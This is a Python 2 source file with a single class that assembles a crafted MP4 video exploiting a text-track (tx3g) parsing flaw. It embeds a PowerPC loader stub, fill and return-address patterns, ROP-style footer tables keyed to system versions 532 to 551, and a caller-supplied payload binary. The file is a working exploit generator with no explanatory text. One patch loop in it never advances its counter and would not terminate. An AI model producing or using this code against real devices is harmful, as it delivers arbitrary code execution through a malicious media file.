class StageFright(object):
    def __init__(self, bin_data, version):
        self.mp4_size = 41224
        self.system_version = version

        self.headerBytes = bytearray([0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, 0x33, 0x67, 0x70, 0x36, 0x00, 0x00, 0x01, 0x00,
                                                    0x69, 0x73, 0x6F, 0x6D, 0x33, 0x67, 0x53, 0x36, 0x00, 0x00, 0x90, 0x00, 0x6D, 0x6F, 0x6F, 0x76,
                                                    0x00, 0x00, 0x00, 0x6C, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC9, 0x5B, 0x81, 0x1A,
                                                    0xC9, 0x5B, 0x81, 0x1A, 0xFA, 0x00, 0x02, 0x58, 0x00, 0x00, 0x02, 0x2D, 0x00, 0x01, 0x00, 0x00,
                                                    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF,
                                                    0xF1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x15, 0x69, 0x6F, 0x64, 0x73, 0x00,
                                                    0x00, 0x00, 0x00, 0x01, 0x07, 0x00, 0x4F, 0xFF, 0xFF, 0x28, 0x03, 0xFF, 0x00, 0x00, 0x88, 0x00,
                                                    0x74, 0x72, 0x61, 0x6B, 0x00, 0x00, 0x00, 0x5C, 0x74, 0x6B, 0x68, 0x64, 0x00, 0x00, 0x00, 0x01,
                                                    0xC9, 0x5B, 0x81, 0x1A, 0xC9, 0x5B, 0x81, 0x1A, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x02, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x80, 0x00, 0x74, 0x78, 0x33, 0x67])

        self.v532_Header_Patch = {
            "values": bytearray([0x88, 0x80, 0x78]),
            "offsets": bytearray([26, 142, 242])
        }

        self.Header_Pattern = {
            "offset": 248,
            "length": 256,
            "spacing": 4,
            "value": 0x60
        }

        self.BinLead = {
            "bytes": bytearray([0x48, 0x00, 0x00, 0x05, 0x7C, 0x68, 0x02, 0xA6, 0x38, 0x80, 0x00, 0x48, 0x7C, 0x84, 0x1A, 0x14,
                                                    0x80, 0xA4, 0x00, 0x00, 0x38, 0x84, 0x00, 0x04, 0x7F, 0xA3, 0xEB, 0x78, 0x38, 0xC0, 0x00, 0x02,
                                                    0x7C, 0xA5, 0x34, 0x30, 0x7C, 0xA9, 0x03, 0xA6, 0x80, 0xA4, 0x00, 0x00, 0x90, 0xA3, 0x00, 0x00,
                                                    0x38, 0x84, 0x00, 0x04, 0x38, 0x63, 0x00, 0x04, 0x42, 0x00, 0xFF, 0xF0, 0x7C, 0x21, 0xF2, 0x14,
                                                    0x80, 0x61, 0x00, 0x04, 0x7C, 0x69, 0x03, 0xA6, 0x4E, 0x80, 0x04, 0x20, 0x00, 0x00, 0x00, 0x00,
                                                    0x94, 0x21]),
            "offset": 504
        }

        self.Bin_Fill = {
            "offset": 586,
            "length": 24238,
            "spacing": 1,
            "value": 0x90
        }

        self.v532_Pattern = {
            "offset": 24824,
            "length": 6152,
            "spacing": 1,
            "value": bytearray([0x01, 0x01, 0xCD, 0x14])
        }

        self.v550_Pattern = {
            "offset": 24824,
            "length": 6152,
            "spacing": 1,
            "value": bytearray([0x01, 0x01, 0xCD, 0x24])
        }

        self.Footer_Fill = {
            "offset": 31924,
            "length": 9300,
            "spacing": 1,
            "value": 0x48
        }

        self.Footer_Magic = {
            "offset": 33008,
            "value": bytearray([0x00, 0x00, 0x01, 0xC5, 0x6D, 0x64, 0x69, 0x61, 0x00, 0x00, 0x00, 0x01, 0x74, 0x78, 0x33, 0x67,
                                                    0x00, 0x00, 0x00, 0x01, 0xFF, 0xFF, 0x80, 0x00])
        }

        self.v532_Footer = {
            "offset": 30976,
            "value": bytearray([0x01, 0x02, 0x04, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xD3, 0x28,
                                                    0x01, 0x04, 0x29, 0xCC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xF8, 0x2C, 0x01, 0x04, 0x22, 0x84, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xD3, 0x28,
                                                    0x01, 0x04, 0x12, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xD3, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x2C,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xD3, 0x28, 0x01, 0x03, 0x70, 0xC0, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xF8, 0x2C,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xD3, 0x28,
                                                    0x01, 0x03, 0x5A, 0x68, 0x01, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x56, 0xDD, 0x28,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xF8, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x2C,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xD3, 0x28, 0x01, 0x03, 0x70, 0xC0, 0x00, 0x00, 0x00, 0x01,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xF8, 0x2C,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xD3, 0x28,
                                                    0x01, 0x02, 0x3E, 0xE8, 0x01, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xF8, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x2C,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xD3, 0x28, 0x01, 0x02, 0x40, 0x10, 0x01, 0x80, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xF8, 0x2C,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x01, 0x03, 0x13, 0x68, 0x01, 0x01, 0xCD, 0x70, 0x01, 0x02, 0xA3, 0x1C, 0x01, 0x02, 0xB7, 0x90,
                                                    0x01, 0x02, 0xF0, 0x9C, 0x14, 0x56, 0xDD, 0x28, 0x00, 0x00, 0x00, 0x08, 0x14, 0x56, 0xCD, 0x28,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x2C,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xD3, 0x28, 0x01, 0x03, 0x70, 0xC0, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xF8, 0x2C,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xD3, 0x28,
                                                    0x01, 0x03, 0x5A, 0x68, 0x01, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x56, 0xDD, 0x28,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xF8, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x2C,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xD3, 0x28, 0x01, 0x03, 0x70, 0xC0, 0x00, 0x00, 0x00, 0x01,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xF8, 0x2C,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xD3, 0x28,
                                                    0x01, 0x02, 0x3E, 0xE8, 0x01, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xF8, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x2C,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xD3, 0x28, 0x01, 0x02, 0x40, 0x10, 0x01, 0x80, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xF8, 0x2C,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x01, 0x03, 0x13, 0x68, 0x01, 0x01, 0xCD, 0x70, 0x01, 0x02, 0xA3, 0x1C, 0x01, 0x02, 0xB7, 0x90,
                                                    0x01, 0x02, 0xF0, 0x9C, 0x14, 0x56, 0xDD, 0x28, 0x00, 0x00, 0x00, 0x08, 0x14, 0x56, 0xCD, 0x28,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0x00, 0x00])
        }

        self.v550_Footer = {
            "offset": 30976,
            "value": bytearray([0x01, 0x02, 0x04, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xDD, 0x70,
                                                    0x01, 0x04, 0x31, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x74, 0x01, 0x04, 0x29, 0xDC, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xDD, 0x70,
                                                    0x01, 0x04, 0x18, 0xE4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xDD, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0xC8,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xDD, 0x70, 0x01, 0x03, 0x76, 0xC0, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x74,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xDD, 0x70,
                                                    0x01, 0x03, 0x5F, 0xC8, 0x01, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x56, 0xDD, 0x28,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0xC8,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xDD, 0x70, 0x01, 0x03, 0x76, 0xC0, 0x00, 0x00, 0x00, 0x01,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x74,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xDD, 0x70,
                                                    0x01, 0x02, 0x3F, 0x88, 0x01, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0xC8,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xDD, 0x70, 0x01, 0x02, 0x40, 0xB0, 0x01, 0x80, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x74,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x01, 0x03, 0x16, 0x18, 0x01, 0x01, 0xCD, 0x80, 0x01, 0x02, 0xA3, 0xB4, 0x01, 0x02, 0xB8, 0x28,
                                                    0x01, 0x02, 0xF1, 0x60, 0x14, 0x56, 0xDD, 0x28, 0x00, 0x00, 0x00, 0x08, 0x14, 0x56, 0xCD, 0x28,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0xC8,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xDD, 0x70, 0x01, 0x03, 0x76, 0xC0, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x74,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xDD, 0x70,
                                                    0x01, 0x03, 0x5F, 0xC8, 0x01, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x56, 0xDD, 0x28,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0xC8,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xDD, 0x70, 0x01, 0x03, 0x76, 0xC0, 0x00, 0x00, 0x00, 0x01,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x74,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xDD, 0x70,
                                                    0x01, 0x02, 0x3F, 0x88, 0x01, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0xC8,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0xDD, 0x70, 0x01, 0x02, 0x40, 0xB0, 0x01, 0x80, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x74,
                                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                    0x01, 0x03, 0x16, 0x18, 0x01, 0x01, 0xCD, 0x80, 0x01, 0x02, 0xA3, 0xB4, 0x01, 0x02, 0xB8, 0x28,
                                                    0x01, 0x02, 0xF1, 0x60, 0x14, 0x56, 0xDD, 0x28, 0x00, 0x00, 0x00, 0x08, 0x14, 0x56, 0xCD, 0x28,
                                                    0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0x00, 0x00])
        }

        self.bin_data = bin_data
        self.mp4_data = bytearray(self.mp4_size)
        return

    def write_bytes(self, bytelist, offset):
        self.mp4_data[offset:(offset + len(bytelist))] = bytelist
        return

    def fill_bytes(self, byte, offset, size, spacing):
        i = 0
        while i < size:
            self.mp4_data[i + offset] = byte
            i += spacing
        return

    def pattern_bytes(self, bytes, offset, size, spacing):
        byteChoice = 0
        i = 0
        while i < size:
            self.mp4_data[i + offset] = bytes[byteChoice]
            byteChoice += 1
            if byteChoice >= len(bytes):
                byteChoice = 0
            i += spacing
        return

    def to_bytes(self, n, length, endianess='big'):
        h = '%x' % n
        s = ('0' * (len(h) % 2) + h).zfill(length * 2).decode('hex')
        return s if endianess == 'big' else s[::-1]

    def write_bin_size(self):
        bin_size = self.to_bytes(len(self.bin_data), 4, 'nope')
        i = 0
        while i < 4:
            print "".join(bin_size[i].encode('hex'))
            self.mp4_data[self.BinLead["offset"] + len(self.BinLead["bytes"]) - 3 - i] = bin_size[i]
            i += 1

    def convert(self):
        if len(self.bin_data) > 29832:
            print "The payload is bigger than 29832 bytes. Exiting..."
            return -1
        else:
            self.write_bytes(self.headerBytes, 0)
            self.fill_bytes(self.Header_Pattern["value"], self.Header_Pattern["offset"], self.Header_Pattern["length"], self.Header_Pattern["spacing"])
            self.write_bytes(self.BinLead["bytes"], self.BinLead["offset"])
            self.fill_bytes(self.Bin_Fill["value"], self.Bin_Fill["offset"], self.Bin_Fill["length"], self.Bin_Fill["spacing"])

            if self.system_version == 532 or self.system_version == 540:
                self.pattern_bytes(self.v532_Pattern["value"], self.v532_Pattern["offset"], self.v532_Pattern["length"], self.v532_Pattern["spacing"])
                self.write_bytes(self.v532_Footer["value"], self.v532_Footer["offset"])
                if self.system_version == 532:
                    i = 0
                    while i < len(self.v532_Header_Patch["offsets"]):
                        self.mp4_data[self.v532_Header_Patch["offsets"][i] ] = self.v532_Header_Patch["values"][i]
            elif self.system_version == 550 or self.system_version == 551:
                self.pattern_bytes(self.v550_Pattern["value"], self.v550_Pattern["offset"], self.v550_Pattern["length"], self.v550_Pattern["spacing"])
                self.write_bytes(self.v550_Footer["value"], self.v550_Footer["offset"])
            else:
                print "The system version is not supported! Exiting..."
            self.fill_bytes(self.Footer_Fill["value"], self.Footer_Fill["offset"], self.Footer_Fill["length"], self.Footer_Fill["spacing"])
            self.write_bytes(self.Footer_Magic["value"], self.Footer_Magic["offset"])
            self.write_bytes(self.bin_data, self.BinLead["offset"] + len(self.BinLead["bytes"]) - 2)
            self.write_bin_size()
            return self.mp4_data
